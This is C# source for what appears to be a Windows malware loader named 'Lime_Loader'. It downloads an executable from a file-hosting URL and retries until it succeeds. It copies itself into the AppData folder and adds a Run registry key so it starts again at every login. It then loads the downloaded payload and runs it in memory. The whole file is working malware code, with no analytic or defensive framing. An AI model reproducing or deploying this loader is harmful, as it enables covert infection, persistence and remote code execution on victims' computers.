using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
using Microsoft.Win32;

namespace Lime_Loader;

internal class Program
{
	public static void Main()
	{
		byte[] payload = DownloadPayload("https://www24.zippyshare.com/d/KstYF0zx/43017/Server.exe");
		if (InstallPayload(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\payload.exe"))
		{
			Environment.Exit(0);
		}
		else
		{
			RunPayload(payload);
		}
	}

	private static bool InstallPayload(string dropPath)
	{
		if (!Process.GetCurrentProcess().MainModule!.FileName!.Equals(dropPath, StringComparison.CurrentCultureIgnoreCase))
		{
			FileStream fileStream = null;
			try
			{
				fileStream = (File.Exists(dropPath) ? new FileStream(dropPath, FileMode.Create) : new FileStream(dropPath, FileMode.CreateNew));
				byte[] array = File.ReadAllBytes(Process.GetCurrentProcess().MainModule!.FileName);
				fileStream.Write(array, 0, array.Length);
				fileStream.Dispose();
				Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").SetValue(Path.GetFileName(dropPath), dropPath);
				Process.Start(dropPath);
				return true;
			}
			catch
			{
				return false;
			}
		}
		return false;
	}

	private static byte[] DownloadPayload(string url)
	{
		while (true)
		{
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
				httpWebRequest.Method = "GET";
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				Stream responseStream = httpWebResponse.GetResponseStream();
				using MemoryStream memoryStream = new MemoryStream();
				responseStream.CopyTo(memoryStream);
				httpWebResponse.Close();
				responseStream.Dispose();
				return memoryStream.ToArray();
			}
			catch
			{
				Thread.Sleep(100);
			}
		}
	}

	private static void RunPayload(byte[] payload)
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			try
			{
				Assembly assembly = AppDomain.CurrentDomain.Load(payload);
				MethodInfo entryPoint = assembly.EntryPoint;
				object obj = assembly.CreateInstance(entryPoint.Name);
				object[] parameters = new object[1];
				if (entryPoint.GetParameters().Length == 0)
				{
					parameters = null;
				}
				entryPoint.Invoke(obj, parameters);
			}
			catch
			{
			}
		});
		thread.IsBackground = false;
		thread.Start();
	}
}
